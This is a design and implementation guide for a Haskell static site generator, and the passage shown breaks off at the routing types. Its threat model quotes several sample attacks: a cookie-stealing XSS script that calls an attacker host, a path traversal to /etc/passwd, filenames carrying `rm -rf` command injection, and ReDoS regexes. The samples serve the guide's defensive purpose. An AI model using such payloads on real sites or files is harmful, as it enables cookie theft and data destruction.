# SARA: Simple, Adaptive, Responsive Architecture
## Industrial-Grade Haskell Static Site Engine
### Architecture & Implementation Guide — v1.1

---

> *"SARA is more than a tool; it is a commitment to the idea that industrial software should be incredibly fast, welcoming to newcomers, and a joy to maintain."*

---

## Revision History

| Version | Date | Changes |
|---------|------|---------|
| v1.0 | 2025 (inception) | Initial document |
| v1.1 | 2026-04-03 | Added §6 Security Architecture; `GlobPattern` newtype mandated in §7.2 and §18; `-Werror` CI mandate added to §21 and §22; GADT record selector restriction documented in §7.1; all review gaps closed |

---

## Table of Contents

1. [Document Scope & Conventions](#1-document-scope--conventions)
2. [System Overview](#2-system-overview)
3. [Architectural Principles](#3-architectural-principles)
4. [Module Topology](#4-module-topology)
5. [Error Architecture](#5-error-architecture)
6. [Security Architecture](#6-security-architecture)
7. [Type System Design — GADTs & Phantom Types](#7-type-system-design--gadts--phantom-types)
8. [Core Engine — Shake Build Graph](#8-core-engine--shake-build-graph)
9. [Frontmatter & Metadata Pipeline](#9-frontmatter--metadata-pipeline)
10. [Routing & URL Preservation Engine](#10-routing--url-preservation-engine)
11. [Template & Rendering Subsystem](#11-template--rendering-subsystem)
12. [SEO Intelligence Layer](#12-seo-intelligence-layer)
13. [Asset Pipeline](#13-asset-pipeline)
14. [Link & Asset Validator](#14-link--asset-validator)
15. [Migration Toolchain (`sara import`)](#15-migration-toolchain-sara-import)
16. [Live Reload — WebSocket Server](#16-live-reload--websocket-server)
17. [Search Index Generation](#17-search-index-generation)
18. [SARA DSL Design](#18-sara-dsl-design)
19. [Library Selection — Rationale & Constraints](#19-library-selection--rationale--constraints)
20. [Project Layout](#20-project-layout)
21. [Cabal Configuration](#21-cabal-configuration)
22. [Implementation Guide — Phase-by-Phase](#22-implementation-guide--phase-by-phase)
23. [Testing Strategy](#23-testing-strategy)
24. [Benchmarking & The SARA Standard](#24-benchmarking--the-sara-standard)
25. [CLI Interface](#25-cli-interface)
26. [Open Design Questions & Future Work](#26-open-design-questions--future-work)
27. [Appendix A: Error Code Reference](#appendix-a-error-code-reference)
28. [Appendix B: Security Threat Register](#appendix-b-security-threat-register)
29. [Appendix C: Glossary](#appendix-c-glossary)

---

## 1. Document Scope & Conventions

### Purpose

This document is the canonical design reference for the SARA static site engine. It covers:

- **Architecture**: every subsystem, its responsibilities, its interfaces, and the rationale behind each design decision.
- **Implementation Guide**: the order of work, exact module names, key type signatures, and algorithm sketches sufficient for a senior Haskell engineer to begin coding without ambiguity.

### What This Document Is Not

- It is **not** a tutorial.
- It is **not** a final API specification — signatures may be refined during implementation.
- It does **not** include complete, runnable Haskell source code. It provides type signatures, data structures, and algorithm descriptions that a qualified implementer must flesh out.

### Conventions

| Symbol | Meaning |
|--------|---------|
| `[MUST]` | Non-negotiable requirement derived from `Sara.md` or security policy |
| `[SHOULD]` | Strong recommendation; deviation requires written justification |
| `[MAY]` | Optional; implementer's discretion |
| `⚠️` | Known hazard or commonly made mistake |
| `📌` | Design decision that was considered and settled |
| `🔒` | Security-critical requirement; must not be weakened without security review |

### Guiding Constraint: No Hallucination

Every library named in this document is real and actively maintained (verified against Hackage as of 2025). Every design decision is traceable to the source document `Sara.md` or to a named engineering tradeoff. Nothing is invented without attribution.

---

## 2. System Overview

SARA is a **demand-driven, parallelised, type-safe static site generator** written in Haskell. It ingests source files (Markdown, templates, assets), applies a user-defined build graph, and emits a fully self-contained static site.

### High-Level Data Flow

```
  Source Directory
        │
        ▼
  ┌─────────────────────────────────────────────┐
  │              sara import (CLI)              │  ← Migration layer (Jekyll/Hugo/Hakyll)
  └───────────────────┬─────────────────────────┘
                      │ scaffolds
                      ▼
  ┌─────────────────────────────────────────────┐
  │           SARA DSL (SaraM monad)            │  ← User's site.hs
  │   match / discover / route / render / ...   │
  └───────────────────┬─────────────────────────┘
                      │ builds
                      ▼
  ┌─────────────────────────────────────────────┐
  │   Security Gate (path, glob, regex checks)  │  ← Reject traversal, injection, ReDoS
  └───────────────────┬─────────────────────────┘
                      │
                      ▼
  ┌─────────────────────────────────────────────┐
  │          Shake Build Graph (Rules)          │  ← Core engine
  │  BLAKE3 content hashing · parallel IO       │
  └──┬──────────┬──────────┬────────────────────┘
     │          │          │
     ▼          ▼          ▼
  Frontmatter  Routing  Asset Pipeline
  Parser       Engine   (Image/CSS/JS)
     │          │          │
     └──────────┴──────────┘
                │
                ▼
  ┌─────────────────────────────────────────────┐
  │    HTML Escape & Sanitisation Pass          │  ← Metadata injection safety
  └───────────────────┬─────────────────────────┘
                      │
                      ▼
  ┌─────────────────────────────────────────────┐
  │           Validation Layer                  │
  │  SEO Audit · Link Checker · Alt-tag Check   │
  └───────────────────┬─────────────────────────┘
                      │
                      ▼
  ┌─────────────────────────────────────────────┐
  │           Renderer                          │
  │  Stache (Mustache) templates · JSON-LD      │
  │  OpenGraph · Twitter Cards                  │
  └───────────────────┬─────────────────────────┘
                      │
                      ▼
             _site/ (output)
                      │
                      ▼
  ┌─────────────────────────────────────────────┐
  │        Live Reload Server (dev mode)        │
  │  HTTP static server · WebSocket broadcast   │
  └─────────────────────────────────────────────┘
```

### Key Invariants

1. **Type-safe routing**: every route is a typed value; invalid routes are rejected at rule-construction time.
2. **No silent failures**: every error either halts the build with a human-readable message or is explicitly demoted to a warning via an `AuditLevel` tag.
3. **Incremental by default**: BLAKE3 hashes are computed before any file is re-processed; unchanged files are never re-rendered.
4. **Zero global state**: the `SaraM` monad carries all configuration; no `IORef` globals outside the explicitly justified `envSiteGraph` accumulator.
5. **Security by construction**: path traversal, template injection, shell injection, and regex denial-of-service are structurally prevented — not merely documented as user responsibility.

---

## 3. Architectural Principles

### 3.1 Separation of Concerns — Five Layers

| Layer | Responsibility | Haskell Boundary |
|-------|---------------|-----------------|
| **DSL** | User-facing rule declaration | `SARA` module public API |
| **Planner** | Translates DSL rules into Shake `Rules` | `SARA.Internal.Planner` |
| **Engine** | Shake build graph execution | `SARA.Internal.Engine` |
| **Processors** | Per-file transformations (parse, render, validate) | `SARA.Processor.*` |
| **Emitters** | Write final output and search index | `SARA.Emitter.*` |

### 3.2 Errors Are First-Class Values

SARA **never** uses `error` or `undefined` in library code. All failures travel as typed values through `ExceptT SaraError IO`. The only permitted `throwIO` sites are:

- Inside Shake rule bodies, where Shake catches and formats them.
- The top-level `main` entry point, after all errors have been collected.

### 3.3 GADTs Over Stringly-Typed Data

Routing, metadata fields, asset kinds, and glob patterns are encoded as GADTs or newtypes with smart constructors so that misuse is a compile error, not a runtime crash.

### 3.4 Aeson as the Universal Metadata Lingua Franca

All metadata — whether it originated as YAML, TOML, or JSON frontmatter — is normalised to `Data.Aeson.Value` immediately after parsing. The rest of the system never sees the raw frontmatter format. This is the "Unified Aeson Data Model" described in `Sara.md`.

### 3.5 Shake as the Build Oracle

SARA does **not** implement its own dependency tracker. Shake provides a battle-tested, parallelised, demand-driven build graph. SARA's job is to translate the user's DSL into correct Shake rules.

### 3.6 Security by Construction

Security properties are enforced by the type system and smart constructors, not by documentation or convention. A user cannot accidentally bypass path-traversal protection, shell-injection protection, or HTML-injection protection because the types make the unsafe operations unavailable in the public API.

---

## 4. Module Topology

```
sara/
├── src/
│   ├── SARA.hs                          -- Public API re-export
│   ├── SARA/
│   │   ├── Error.hs                     -- SaraError GADT + pretty-printer
│   │   ├── Config.hs                    -- SaraConfig, AuditLevel
│   │   ├── Types.hs                     -- Core types: Item, Route, AssetKind, GlobPattern
│   │   ├── Monad.hs                     -- SaraM monad stack
│   │   ├── DSL.hs                       -- match, discover, route, render, remapMetadata, validateSEO
│   │   ├── Security/
│   │   │   ├── Error.hs                 -- SecurityError (PathTraversal, ShellInjection, ReDoS, etc.)
│   │   │   ├── PathGuard.hs             -- Project-root confinement for all file paths
│   │   │   ├── GlobGuard.hs             -- Safe glob newtype + smart constructor
│   │   │   ├── RegexGuard.hs            -- Safe regex newtype + ReDoS complexity bound
│   │   │   ├── HtmlEscape.hs            -- Mandatory HTML-escaping pass for metadata values
│   │   │   └── ShellGuard.hs            -- Safe shell-out wrappers; no string interpolation
│   │   ├── Internal/
│   │   │   ├── Planner.hs               -- DSL → Shake Rules translation
│   │   │   ├── Engine.hs                -- Shake entry point, BLAKE3 oracle
│   │   │   └── Hash.hs                  -- BLAKE3 wrappers
│   │   ├── Frontmatter/
│   │   │   ├── Error.hs                 -- FrontmatterError
│   │   │   ├── Detect.hs               -- Detect YAML/TOML/JSON delimiter
│   │   │   ├── Parser.hs               -- Universal parse → Aeson Value
│   │   │   └── Remap.hs                -- Field remapping
│   │   ├── Routing/
│   │   │   ├── Error.hs                 -- RoutingError
│   │   │   ├── Types.hs                 -- Route GADT
│   │   │   └── Engine.hs               -- regexRoute, slugRoute, prettyRoute
│   │   ├── Markdown/
│   │   │   ├── Error.hs                 -- MarkdownError (with source position)
│   │   │   ├── Parser.hs               -- cmark-gfm wrapper
│   │   │   └── Shortcode.hs            -- Shortcode expansion
│   │   ├── Template/
│   │   │   ├── Error.hs                 -- TemplateError
│   │   │   └── Renderer.hs             -- Stache renderer
│   │   ├── SEO/
│   │   │   ├── Error.hs                 -- SEOError (AltMissing, HeadingSkip, etc.)
│   │   │   ├── JsonLD.hs               -- Schema.org JSON-LD generation
│   │   │   ├── OpenGraph.hs            -- OG tag generation
│   │   │   └── Audit.hs                -- Alt-tag + heading hierarchy auditor
│   │   ├── Validator/
│   │   │   ├── Error.hs                 -- ValidatorError (BrokenLink, MissingAsset)
│   │   │   ├── LinkChecker.hs          -- Internal link validation
│   │   │   └── AssetChecker.hs         -- src= attribute validation
│   │   ├── Asset/
│   │   │   ├── Error.hs                 -- AssetError
│   │   │   ├── Discover.hs             -- Glob-based auto-discovery
│   │   │   ├── Image.hs                -- JuicyPixels resize + WebP/AVIF via safe shell-out
│   │   │   └── Copy.hs                 -- Zero-copy asset passthrough
│   │   ├── Search/
│   │   │   └── Index.hs                -- Pagefind-compatible JSON index generation
│   │   ├── LiveReload/
│   │   │   ├── Server.hs               -- Warp HTTP + websockets broadcast
│   │   │   └── Watcher.hs              -- fsnotify file watcher
│   │   └── Migration/
│   │       ├── Error.hs                 -- MigrationError
│   │       ├── Detect.hs               -- Detect source SSG
│   │       ├── Jekyll.hs               -- Jekyll shortcode translator
│   │       ├── Hugo.hs                 -- Hugo shortcode translator
│   │       └── Scaffold.hs             -- `sara import` scaffolder
│   └── Main.hs                          -- CLI entry point (optparse-applicative)
├── test/
│   ├── Spec.hs
│   ├── SARA/
│   │   ├── FrontmatterSpec.hs
│   │   ├── RoutingSpec.hs
│   │   ├── MarkdownSpec.hs
│   │   ├── SEOSpec.hs
│   │   ├── ValidatorSpec.hs
│   │   ├── SecuritySpec.hs              -- Security-specific unit tests
│   │   └── MigrationSpec.hs
│   └── Property/
│       ├── RoutingProp.hs               -- QuickCheck routing invariants
│       ├── FrontmatterProp.hs           -- QuickCheck malformed frontmatter
│       ├── MetadataProp.hs              -- QuickCheck remap roundtrip
│       └── SecurityProp.hs             -- QuickCheck path/glob/regex safety
├── bench/
│   ├── Main.hs                          -- criterion benchmarks
│   └── Fixtures.hs                     -- 5k/10k synthetic post generators
└── sara.cabal
```

---

## 5. Error Architecture

### 5.1 Design Rationale

`Sara.md` explicitly demands **Human-First Error Messages** that pinpoint exact source lines, replacing GHC backtraces. This requires that errors carry structured source location data, not just strings.

### 5.2 The Master Error Type

**File: `SARA/Error.hs`**

```haskell
{-# LANGUAGE GADTs          #-}
{-# LANGUAGE DataKinds      #-}
{-# LANGUAGE KindSignatures #-}

module SARA.Error
  ( SaraError(..)
  , SaraErrorKind(..)
  , SourcePos(..)
  , AuditLevel(..)
  , renderError       -- :: SaraError k -> Text
  , renderErrorColor  -- :: SaraError k -> Text  (ANSI coloured)
  ) where

import Data.Text (Text)

-- | Source location carried by every error that originates in user content.
data SourcePos = SourcePos
  { spFile   :: !FilePath
  , spLine   :: !Int
  , spColumn :: !Int
  } deriving (Eq, Show)

-- | Discriminates how the build should respond to an error.
data AuditLevel
  = AuditFail    -- ^ Halt the build immediately.
  | AuditWarn    -- ^ Emit a warning; continue the build.
  deriving (Eq, Ord, Show)

-- | The unified error kind tag, used as the GADT index.
data SaraErrorKind
  = EKFrontmatter
  | EKRouting
  | EKMarkdown
  | EKTemplate
  | EKSEO
  | EKValidator
  | EKAsset
  | EKMigration
  | EKConfig
  | EKSecurity      -- ^ New in v1.1: security violations

-- | GADT: each constructor carries the minimum evidence needed
--   to render a precise, human-readable diagnostic.
--
--   🔒 IMPORTANT NOTE ON GADT RECORD SELECTORS:
--   GHC permits record syntax in GADT constructors only when the return
--   type is fully determined (no existential or ambiguous type variables).
--   All constructors here have concrete return types (SaraError 'EKFoo),
--   so record selectors are valid. Implementers must not add constructors
--   with polymorphic or existential return types without removing record
--   syntax from those constructors.
data SaraError (k :: SaraErrorKind) where

  -- Frontmatter errors
  FrontmatterUnknownFormat
    :: { fmFile :: !FilePath }
    -> SaraError 'EKFrontmatter
  FrontmatterParseFailure
    :: { fmFile :: !FilePath, fmPos :: !SourcePos, fmDetail :: !Text }
    -> SaraError 'EKFrontmatter
  FrontmatterRemapMissing
    :: { fmFile :: !FilePath, fmFrom :: !Text }
    -> SaraError 'EKFrontmatter

  -- Routing errors
  RouteRegexInvalid
    :: { rtPattern :: !Text, rtDetail :: !Text }
    -> SaraError 'EKRouting
  RouteConflict
    :: { rtFile1 :: !FilePath, rtFile2 :: !FilePath, rtOutput :: !FilePath }
    -> SaraError 'EKRouting

  -- Markdown errors
  MarkdownUnsupportedExtension
    :: { mdFile :: !FilePath, mdPos :: !SourcePos, mdFeature :: !Text }
    -> SaraError 'EKMarkdown

  -- Template errors
  TemplateNotFound
    :: { tplName :: !FilePath }
    -> SaraError 'EKTemplate
  TemplateRenderFailure
    :: { tplName :: !FilePath, tplDetail :: !Text }
    -> SaraError 'EKTemplate
  TemplateKeyMissing
    :: { tplName :: !FilePath, tplKey :: !Text }
    -> SaraError 'EKTemplate
  TemplateUnsafeInterpolation
    :: { tplName :: !FilePath, tplLine :: !Int }
    -> SaraError 'EKTemplate   -- ^ Fired when {{{ }}} unescaped syntax detected

  -- SEO errors
  SEOAltMissing
    :: { seoFile :: !FilePath, seoPos :: !SourcePos, seoSrc :: !Text }
    -> SaraError 'EKSEO
  SEOHeadingSkip
    :: { seoFile :: !FilePath, seoPos :: !SourcePos, seoFrom :: !Int, seoTo :: !Int }
    -> SaraError 'EKSEO
  SEOTitleMissing
    :: { seoFile :: !FilePath }
    -> SaraError 'EKSEO

  -- Validator errors
  ValidatorBrokenLink
    :: { valFile :: !FilePath, valPos :: !SourcePos, valTarget :: !FilePath }
    -> SaraError 'EKValidator
  ValidatorMissingAsset
    :: { valFile :: !FilePath, valPos :: !SourcePos, valSrc :: !Text }
    -> SaraError 'EKValidator

  -- Asset errors
  AssetProcessingFailed
    :: { astFile :: !FilePath, astDetail :: !Text }
    -> SaraError 'EKAsset

  -- Migration errors
  MigrationUnsupportedShortcode
    :: { migFile :: !FilePath, migShortcode :: !Text }
    -> SaraError 'EKMigration

  -- Config errors
  ConfigKeyMissing
    :: { cfgKey :: !Text }
    -> SaraError 'EKConfig

  -- Security errors (new in v1.1)
  SecurityPathTraversal
    :: { secFile :: !FilePath, secAttempted :: !FilePath, secRoot :: !FilePath }
    -> SaraError 'EKSecurity
  SecurityGlobEscape
    :: { secGlob :: !Text, secReason :: !Text }
    -> SaraError 'EKSecurity
  SecurityRegexReDoS
    :: { secPattern :: !Text, secReason :: !Text }
    -> SaraError 'EKSecurity
  SecurityShellInjection
    :: { secPath :: !FilePath, secReason :: !Text }
    -> SaraError 'EKSecurity
  SecurityUnsafeTemplate
    :: { secTemplate :: !FilePath, secLine :: !Int }
    -> SaraError 'EKSecurity

-- | Existential wrapper so errors from all subsystems can be collected
--   in a single list without losing their kind information at the call site.
data AnySaraError where
  AnySaraError :: SaraError k -> AnySaraError
```

### 5.3 Error Rendering

Each `SaraError` constructor maps to a multi-line, coloured diagnostic. The renderer follows a consistent three-part format modelled on the rustc diagnostic standard:

```
error[E0042]: broken internal link
  --> posts/hello-world.md:14:5
   |
14 |   See also [my post](../about/missing.html)
   |                      ^^^^^^^^^^^^^^^^^^^^^ target does not exist in build graph
   = note: run `sara build --check-links` for a full link report
```

Security errors use the same format with a distinct `security` prefix:

```
security[S0001]: path traversal attempt blocked
  --> sara.yaml (discover glob)
   |
 3 |   discover "../../etc/passwd"
   |            ^^^^^^^^^^^^^^^^^ path escapes project root (/home/user/mysite)
   = note: all resolved paths must be descendants of the project root
```

The renderer uses `prettyprinter` with ANSI colour codes via `prettyprinter-ansi-terminal`. The colour scheme mirrors rustc's diagnostic output.

---

## 6. Security Architecture

> 🔒 This section is **mandatory**. Every point below is a hard requirement. No item may be demoted to a guideline or deferred to a later version without a documented security review.

### 6.1 Threat Model

SARA is a build-time tool, not a runtime web server. Its attack surface is therefore the **build process itself** and the **generated HTML output** consumed by end-users' browsers. SQL injection does not apply because SARA has no database connectivity whatsoever — not at build time, not at runtime.

The applicable threat categories are:

| Threat ID | Category | Attack Vector | SARA's Exposure |
|-----------|----------|--------------|-----------------|
| T-01 | HTML/Template Injection | User-controlled frontmatter values injected into output HTML | High |
| T-02 | Path Traversal | User-supplied glob patterns or file paths escaping the project root | High |
| T-03 | Shell Injection | File paths containing metacharacters passed to external processes | Medium |
| T-04 | Regex Denial-of-Service (ReDoS) | Pathological regex patterns in `regexRoute` hanging the build | Medium |
| T-05 | Unescaped Template Interpolation | Developer using `{{{ }}}` raw interpolation in templates | Medium |

Each threat has a dedicated subsection below.

### 6.2 T-01: HTML Injection via Frontmatter Metadata

**Threat**: A Markdown file contains a frontmatter field such as:

```yaml
title: "Hello <script>fetch('https://evil.example/steal?c='+document.cookie)</script>"
```

If this value is interpolated into an HTML template without escaping, the generated page contains an XSS payload that executes in any visitor's browser.

**Mitigation — mandatory HTML escaping pass**:

`stache` (Mustache) **does** HTML-escape `{{ variable }}` interpolations by default. Triple-brace `{{{ variable }}}` opts out of escaping. The mitigation strategy is two-pronged:

**Part A — Default safe**: All metadata values pass through the template renderer using `{{ }}` (escaped) syntax. This is the default and must not be changed.

**Part B — Audit for unsafe interpolation**: The template audit pass (run at build time, before any page is rendered) scans every template file for `{{{ }}}` occurrences and fires `TemplateUnsafeInterpolation` (level: `AuditFail` by default). The only legitimate use of `{{{ }}}` is for SARA-injected pre-sanitised fields (`sara.jsonLD`, `sara.ogTags`, `sara.twitterTags`) which are generated by SARA itself from controlled data. These are whitelisted by prefix.

```haskell
-- File: SARA/Security/HtmlEscape.hs

module SARA.Security.HtmlEscape
  ( SafeHtml(..)           -- newtype wrapper: value is known-escaped HTML
  , escapeHtmlValue        -- :: Aeson.Value -> Aeson.Value
  , auditTemplateForRawInterpolation
                           -- :: FilePath -> Text -> [SaraError 'EKTemplate]
  , saraManagedPrefix      -- :: Text
                           -- ^ "sara." — whitelisted for raw interpolation
  ) where

import Data.Aeson (Value(..))
import Data.Text  (Text)

-- | Opaque newtype. A 'SafeHtml' value has been HTML-escaped.
--   It can only be constructed via 'escapeHtmlValue' or by SARA internals.
newtype SafeHtml = SafeHtml { unSafeHtml :: Text }
  deriving (Eq, Show)

-- | Recursively HTML-escape all String values in an Aeson Value tree.
--   Numbers, booleans, nulls, and arrays/objects are traversed but not altered.
--   Only 'String' leaf nodes are escaped.
escapeHtmlValue :: Value -> Value

-- | Scan a template file's text for {{{ }}} patterns.
--   Whitelist any occurrence where the key starts with 'saraManagedPrefix'.
--   Emit 'TemplateUnsafeInterpolation' for all remaining occurrences.
auditTemplateForRawInterpolation
  :: FilePath   -- ^ Template path (for error messages)
  -> Text       -- ^ Template source text
  -> [SaraError 'EKTemplate]

saraManagedPrefix :: Text
saraManagedPrefix = "sara."
```

**Test requirements**:

- A template containing `{{{ title }}}` → `TemplateUnsafeInterpolation` at line N.
- A template containing `{{{ sara.jsonLD }}}` → no error (whitelisted).
- A frontmatter `title` containing `<script>` → rendered output contains `&lt;script&gt;`, not the raw tag.
- A frontmatter `description` containing `"` → rendered output contains `&quot;`.

### 6.3 T-02: Path Traversal in Asset Discovery and File Operations

**Threat**: A user's `site.hs` contains:

```haskell
discover "../../etc/passwd"
```

or a frontmatter field resolves to a path that, after normalisation, escapes the project root.

**Mitigation — `PathGuard` module**:

```haskell
-- File: SARA/Security/PathGuard.hs

module SARA.Security.PathGuard
  ( ProjectRoot(..)       -- newtype; constructed once at startup
  , SafePath(..)          -- newtype; a path confirmed within root
  , mkProjectRoot         -- :: FilePath -> IO ProjectRoot
  , guardPath             -- :: ProjectRoot -> FilePath -> Either (SaraError 'EKSecurity) SafePath
  , guardPathUnsafe       -- :: ProjectRoot -> FilePath -> SafePath
                          -- ^ Internal use only; panics if called on an unsafe path
  ) where

-- | Opaque newtype for the project root, established once at 'sara build' startup.
newtype ProjectRoot = ProjectRoot FilePath
  deriving (Eq, Show)

-- | Opaque newtype for a path confirmed to be within the project root.
--   Only 'guardPath' and SARA internals can construct this.
newtype SafePath = SafePath { unSafePath :: FilePath }
  deriving (Eq, Show)

-- | Construct a 'ProjectRoot' from the current working directory or
--   an explicit '--root' CLI flag. The path is canonicalised via
--   'System.Directory.canonicalizePath' before storage.
mkProjectRoot :: FilePath -> IO ProjectRoot

-- | Canonicalise the candidate path and confirm it is a descendant
--   of the project root. Returns 'SecurityPathTraversal' if it is not.
--
--   Algorithm:
--   1. canonicalizePath candidate (resolves symlinks and '..' components)
--   2. Check: canonicalRoot `isPrefixOf` canonicalCandidate
--   3. If not: return Left (SecurityPathTraversal ...)
--   4. If yes: return Right (SafePath canonicalCandidate)
guardPath
  :: ProjectRoot
  -> FilePath               -- ^ Candidate path (may be relative or contain '..')
  -> Either (SaraError 'EKSecurity) SafePath
```

**Enforcement points** (🔒 every one is mandatory):

1. `discoverAssets` in `SARA/Asset/Discover.hs` calls `guardPath` on every glob-expanded path before creating a Shake rule for it.
2. `readMarkdown` calls `guardPath` on its argument before opening the file.
3. `render` calls `guardPath` on the template path before loading it.
4. `processImage` calls `guardPath` on both input and output paths.
5. `sara import` calls `guardPath` on every file it copies.

**Test requirements**:

- `guardPath root "../../etc/passwd"` → `SecurityPathTraversal`.
- `guardPath root "/etc/passwd"` → `SecurityPathTraversal` (absolute path outside root).
- `guardPath root "posts/../posts/hello.md"` → `SafePath` (normalises to within root).
- Symlink pointing outside root → `SecurityPathTraversal` (because `canonicalizePath` resolves it).

### 6.4 T-03: Shell Injection in Image Processing

**Threat**: An image file is named `logo$(rm -rf ~).png`. If this name is interpolated into a shell command string (e.g., via `System.Process.callCommand`), the shell will execute the embedded command.

**Mitigation — list-form shell invocation only**:

All external process invocations use Shake's `cmd` in list form, which passes arguments directly to `execvp` without invoking a shell interpreter:

```haskell
-- File: SARA/Security/ShellGuard.hs

module SARA.Security.ShellGuard
  ( safeCmd     -- :: FilePath -> [FilePath] -> Action ()
  , validateArg -- :: FilePath -> Either (SaraError 'EKSecurity) ()
  ) where

import Development.Shake (cmd, CmdOption(..))

-- | Execute an external command with arguments.
--   NEVER uses shell string interpolation.
--   Arguments are passed as a Haskell list directly to execvp.
--   This is immune to shell injection regardless of argument content.
safeCmd
  :: FilePath    -- ^ Executable (e.g. "cwebp")
  -> [FilePath]  -- ^ Arguments (may contain arbitrary characters safely)
  -> Action ()
safeCmd exe args = cmd (exe : args)

-- | Pre-flight check: reject file paths containing NUL bytes,
--   which can truncate strings in C-level APIs.
validateArg :: FilePath -> Either (SaraError 'EKSecurity) ()
```

🔒 **`callCommand`, `system`, and `rawSystem` are banned** in all SARA library modules. GHC's `-Wmissing-import-lists` and a custom HLint rule should flag any import of `System.Process.callCommand` or `System.Process.system`.

**Usage in image processing**:

```haskell
-- In SARA/Asset/Image.hs

convertToWebP :: SafePath -> SafePath -> Action ()
convertToWebP (SafePath input) (SafePath output) =
  safeCmd "cwebp" ["-q", "80", input, "-o", output]
  -- No shell. No interpolation. 'input' may contain any characters safely.
```

**Test requirements**:

- A file named `test$(whoami).png` processed through `convertToWebP` → no shell command executed; only `cwebp` is invoked with the literal filename as argument.
- `validateArg` on a path containing a NUL byte → `SecurityShellInjection`.

### 6.5 T-04: Regex Denial-of-Service (ReDoS)

**Threat**: A user supplies a `regexRoute` pattern such as `(a+)+$`. Backtracking PCRE engines exhibit exponential time complexity on such patterns when matched against long non-matching strings. A malicious or careless pattern could hang the build indefinitely.

**Mitigation — complexity budget and linear-time detection**:

```haskell
-- File: SARA/Security/RegexGuard.hs

module SARA.Security.RegexGuard
  ( SafeRegex(..)      -- opaque newtype; only constructible via 'mkSafeRegex'
  , mkSafeRegex        -- :: Text -> Either (SaraError 'EKSecurity) SafeRegex
  ) where

import Data.Text (Text)

-- | Opaque newtype. A 'SafeRegex' has passed the ReDoS complexity check.
newtype SafeRegex = SafeRegex { unSafeRegex :: Regex }

-- | Smart constructor.
--   1. Compile the regex with 'regex-pcre-builtin'.
--      Compilation failure → 'RouteRegexInvalid'.
--   2. Run the structural complexity check:
--      a. Reject patterns containing nested quantifiers: (X+)+ (X*)* (X+)* (X*)+ etc.
--      b. Reject patterns containing alternation inside unbounded repetition: (a|ab)+
--      c. Reject patterns where the total quantifier nesting depth exceeds 3.
--      d. Reject patterns containing lookahead/lookbehind of unbounded width.
--      Complexity violation → 'SecurityRegexReDoS'.
--   3. Return 'Right (SafeRegex compiled)' only when both checks pass.
mkSafeRegex :: Text -> Either (SaraError 'EKSecurity) SafeRegex
```

📌 **Design decision**: The structural check is conservative. Some safe patterns may be rejected. This is intentional — a false positive on a route regex is a minor inconvenience; a false negative could hang CI forever. The error message for `SecurityRegexReDoS` includes a suggestion to rewrite the pattern using atomic groups or possessive quantifiers.

**Test requirements**:

- `mkSafeRegex "(a+)+"` → `SecurityRegexReDoS`.
- `mkSafeRegex "(a|ab)+"` → `SecurityRegexReDoS`.
- `mkSafeRegex "/posts/([0-9]{4})/(.*)"` → `Right SafeRegex` (the canonical SARA example is safe).
- `mkSafeRegex "/archives/\\1/\\2"` (replacement, not a regex) → this is never passed to `mkSafeRegex`; replacements are plain strings.

### 6.6 T-05: Unescaped Template Interpolation in Bundled Templates

**Threat**: The default templates shipped with SARA use `{{{ }}}` for some value (perhaps for performance reasons or by mistake), enabling injection through any frontmatter field.

**Mitigation**:

1. The bundled default templates (`templates/default.html`, `templates/post.html`, `templates/index.html`) must **never** contain `{{{ }}}` except for the explicitly whitelisted `sara.*` managed fields.
2. A CI test (`test/SARA/SecuritySpec.hs`) reads every file in `templates/` and asserts zero `{{{ }}}` occurrences outside the whitelist. This test runs as part of the standard test suite and is a **release gate**.
3. The template audit pass (described in §6.2) also covers user-supplied templates at build time.

### 6.7 Security Module Summary

| Module | Threat Addressed | Key Export |
|--------|-----------------|------------|
| `SARA.Security.PathGuard` | T-02 Path traversal | `guardPath`, `SafePath` |
| `SARA.Security.GlobGuard` | T-02 Glob escape | `GlobPattern` newtype, `mkGlobPattern` |
| `SARA.Security.RegexGuard` | T-04 ReDoS | `SafeRegex` newtype, `mkSafeRegex` |
| `SARA.Security.HtmlEscape` | T-01 HTML injection | `escapeHtmlValue`, `auditTemplateForRawInterpolation` |
| `SARA.Security.ShellGuard` | T-03 Shell injection | `safeCmd`, `validateArg` |
| `SARA.Security.Error` | All | `SaraError 'EKSecurity` constructors |

---

## 7. Type System Design — GADTs & Phantom Types

### 7.1 The `GlobPattern` Newtype (new in v1.1)

`GlobPattern` is a **newtype with a smart constructor**, not a raw `Text`. This is the SARA-standard approach for any value that must be validated before use. Accepting raw `Text` in the DSL public API would allow invalid or path-traversal glob patterns to reach the Shake engine without rejection.

```haskell
-- File: SARA/Types.hs  (and re-exported from SARA.Security.GlobGuard)

-- | Opaque newtype. A 'GlobPattern' has been:
--   1. Validated as a syntactically correct filepattern glob.
--   2. Confirmed to not contain absolute paths or '..' components
--      that could escape the project root.
newtype GlobPattern = GlobPattern Text
  deriving (Eq, Show)

-- | Smart constructor. Performs both validation steps.
--   Returns 'SecurityGlobEscape' if the pattern contains '..' or
--   an absolute path root.
--   Returns 'ConfigKeyMissing' if the pattern is syntactically invalid
--   per the 'filepattern' library rules.
mkGlobPattern
  :: Text
  -> Either (SaraError 'EKSecurity) GlobPattern

-- | Unwrap. Only available within SARA.Internal.* modules.
--   The public API never exposes the raw Text.
unGlobPattern :: GlobPattern -> Text
```

🔒 The DSL combinator `discover` accepts `GlobPattern`, not `Text`. Users construct `GlobPattern` via `mkGlobPattern` or the DSL literal helpers. Any `Text` that fails validation produces a `SecurityGlobEscape` error at rule-construction time, before any filesystem access.

### 7.2 The `Item` Type

An `Item` is the central data structure passed between pipeline stages. It uses a phantom type parameter to track whether its metadata has been validated.

```haskell
-- | 'v' is a phantom type: 'Unvalidated or 'Validated.
data ValidationState = Unvalidated | Validated

data Item (v :: ValidationState) = Item
  { itemPath     :: !FilePath            -- ^ Source path (a 'SafePath' was used to read it)
  , itemRoute    :: !(Route 'Resolved)   -- ^ Output path (after route application)
  , itemMeta     :: !Aeson.Object        -- ^ Unified metadata (post-remap, HTML-escaped)
  , itemBody     :: !Text                -- ^ Raw or rendered body
  , itemHash     :: !BLAKE3.Hash         -- ^ Content hash for incremental builds
  }

-- | Only items that have passed SEO validation may be rendered.
--   'validateSEO' is the only function that can produce 'Item 'Validated'.
validateSEO :: Item 'Unvalidated -> ExceptT [AnySaraError] IO (Item 'Validated)
```

📌 Note: `itemMeta` stores values that have **already been HTML-escaped** by `escapeHtmlValue` during `readMarkdown`. This is the correct point of escaping — once, immediately after parsing, before any other code can observe the raw values.

### 7.3 The `Route` GADT

```haskell
data RouteState = Abstract | Resolved

-- | A route is either a pattern (abstract) or a concrete output path (resolved).
data Route (s :: RouteState) where
